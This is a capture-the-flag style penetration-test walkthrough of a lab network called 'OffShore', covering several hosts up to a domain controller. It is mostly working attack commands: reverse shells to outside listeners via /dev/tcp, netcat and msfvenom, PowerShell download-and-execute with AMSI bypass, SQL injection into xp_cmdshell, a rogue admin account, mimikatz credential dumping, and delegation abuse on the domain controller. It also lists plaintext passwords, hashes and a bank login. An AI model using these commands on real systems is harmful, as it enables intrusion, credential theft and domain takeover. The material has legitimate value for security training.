# OffShore

Do a ping sweep with

```
fping -s -g 10.10.110.0/24
```

Three host alive

* 10.10.110.2
* 10.10.110.123
* 10.10.110.124

## NIX01

Scan the ports

```
nmap -Pn -sT -sV -T5 10.10.110.123 -p-
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

in the port :8000 we can see the splunk web app.&#x20;

[https://www.n00py.io/2018/10/popping-shells-on-splunk/](https://www.n00py.io/2018/10/popping-shells-on-splunk/)

Upload the splunk shell from [https://github.com/TBGSecurity/splunk\_shells](https://github.com/TBGSecurity/splunk\_shells)

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Postgres is listening

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Don't know what type of vuln

{% code overflow="wrap" %}
```
PATH="/usr/local/pgsql/bin:$PATH" ./pg_exec.sh -c '/bin/bash -c "0<&97-;exec 97<>/dev/tcp/10.10.14.3/4444;sh <&97 >&97 2>&97"'
```
{% endcode %}

and in the new shell

```
sudo /usr/bin/tail -f -n +1 /root/.ssh/id_rsa
```

## Pivoting

Setup proxychains with

```
ssh -i id_rsa_NIX01 -D 9050 root@10.10.110.123
```

And ligolo-ng. After that we can ping sweep to find hosts on the other Lan

```
fping -s -g 172.16.1.0/24
```



<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## MS01

Port Scan

```
nmap -Pn -sT -sV -T5 172.16.1.30
```

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

run tcp dump on NIX01, creds and a flag can be grabbed:&#x20;

```
tcpdump -i eth0 -nn -s0 -v port 80 -w test.cap
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

creds= `admin`:`Zaq12wsx!`. Access the website and go under _“Workflow > Create New Workflow” then drag “Start Process” to the workflow pane._&#x20;

{% code overflow="wrap" %}
```
cmd /c powershell -c iex (iwr -UseBasicParsing http://172.16.1.23:8080/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.1.23:8080/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.1.23:8080/Invoke-PowerShellTcp.ps1)
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

in C:\Users\administrator.ADMIN.000\Documents we can file a xlsx protected by password. Crackit with john

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<table><thead><tr><th width="195">Account</th><th width="186">Username</th><th width="114">Pass</th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td>Network login</td><td>ned.flanders_adm</td><td>Lefthandedyeah!</td></tr><tr><td>Email</td><td><a href="mailto:ned.flanders@offshore.com">ned.flanders@offshore.com</a></td><td>Lefty1974!</td></tr></tbody></table>

<table><thead><tr><th width="195">Bank</th><th width="186"></th><th width="114"></th></tr></thead><tbody><tr><td><a href="https://www.betabank.eu/">https://www.betabank.eu/</a></td><td>991103</td><td>0419!094Ar</td></tr></tbody></table>

## WSADMIN

Scan the ports

```
nmap -Pn -sT -sV -T5 172.16.1.36
```

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Login with xfreerdp

{% code overflow="wrap" %}
```
xfreerdp /u:'ned.flanders_adm' /p:'Lefthandedyeah!' /cert-ignore /drive:Tools,/home/kali/Desktop/Tools /v:172.16.1.36 +clipboard
```
{% endcode %}

With PowerUp.Ps1 we can identify an unquoted service path

{% code overflow="wrap" %}
```
generate exe         : msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4443 -f exe > Lavasoft.WCAssistant.WinService.exe
place it under       : C:\Program Files (x86)\Lavasoft\Web Companion\Application"
restart the service  : sc.exe stop WCAssistantService > sc.exe start WCAssistantService
```
{% endcode %}

now add  an account that we control to the local administrator group

<pre><code>net user hacker hacker123 /add
<strong>net localgroup administrators hacker /add
</strong></code></pre>

Logout and reconnect to refresh the privileges. Dump creds with mimikatz

| User    | Password                                                                                                                  | hash                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------- | -------------------------------- |
| WSADM$  | M9f,Dzf_5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW\&t/?0Hm)R>)ZkcswFkz:8PQFp_b!>4 | 19f221a69c0693ebfdc064393b55d509 |
| wsadmin | Workstationadmin1!                                                                                                        | 669b12a3bac275251170afbe2c5de8c2 |
|         |                                                                                                                           |                                  |



## WS02

Scan the ports

```
nmap -Pn -sT -sV -T5 172.16.1.101
```

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Enter using evil-winrm with the creds previously found

{% code overflow="wrap" %}
```
evil-winrm -u 'wsadmin' -H '669b12a3bac275251170afbe2c5de8c2' -i 172.16.1.101 -s ../Tools/CRTE/
```
{% endcode %}

| user  | passw                                                                                                             | hash                             |
| ----- | ----------------------------------------------------------------------------------------------------------------- | -------------------------------- |
| ws02$ | C(,XH/CsF zf.j`V/^_T."Aq/l#cDitRw<B@m.7/e,;O^M*RHq/sqFlJb!GLotI\N5f6V571QZ)KO;*]MgnHW$<[txRNygHy0Axj`\[e/egkT5bl4 | c72e375bed0918ced38b7a8d3e7f5e09 |
|       |                                                                                                                   |                                  |
|       |                                                                                                                   |                                  |

## WEB-WIN01

Scan the ports

```
nmap -Pn -sT -sV -T5 172.16.1.24
```

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

login screen on [http://172.16.1.24/login](http://172.16.1.24/login)

Login with svc\_iis:::Vintage! (idk where to find them) and bypass the next login screen with a simple SQLi.

Now there is a SOAP request that you can make, found out at this file /DocumentsService.asmx?WSDL

us wsdler to parse the request and repeter to send request to the dev endpoint. The author field is vulnerable to sqli

{% code overflow="wrap" %}
```
>a'); exec xp_cmdshell "powershell -c iex(iwr -UseBasicParsing http://172.16.1.23:8080/Invoke-PowerShellTcp.ps1)"--
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Inside c:\users\public\libraries there are credentials for a user

```
ver = "\\172.16.4.100"  
$FullPath = "$Server\q1\backups"  
$username = "pgibbons"  
$password = "I l0ve going Fishing!"
```

On bloodhound we can see that pgibbons can control the user salvador

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
.\RunasCs.exe pgibbons "I l0ve going Fishing!" "powershell.exe /c 'net user salvador hacker1 /domain'"
```
{% endcode %}

```
net rpc password "salvador" -U "corp.local"/"pgibbons" -S "172.16.1.5"
```

<figure><img src="../.gitbook/assets/immagine (43).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
net rpc group addmem "SECURITY ENGINEERS" "salvador" -U "corp.local"/"salvador"%"hacker1" -S "172.16.1.5"
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (44).png" alt=""><figcaption></figcaption></figure>

```
net rpc password "CYBER_ADM" -U "corp.local"/"salvador" -S "172.16.1.5"
```

now login with remmina

## DC01

<figure><img src="../.gitbook/assets/immagine (45).png" alt=""><figcaption></figcaption></figure>

Import Powermad.ps1 and then

{% code overflow="wrap" %}
```
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```
{% endcode %}

Import Powerview and then

{% code overflow="wrap" %}
```
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```
{% endcode %}

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:

{% code overflow="wrap" %}
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```
{% endcode %}

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:

{% code overflow="wrap" %}
```
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
{% endcode %}



{% code overflow="wrap" %}
```powershell
schtasks /create /S WEB-WIN01 /SC Weekly /RU "NT Authority\SYSTEM" /TN "hacker" /TR "powershell.exe -c 'C:\Users\cyber_adm\nc64.exe 172.16.1.23 4444 -e powershell.exe'"
```
{% endcode %}

and launch it with a listener open

```powershell
schtasks /Run /S web-win01.corp.local /TN "hacker"
```

Now use rubeus to forge the tickets and get a shell on share
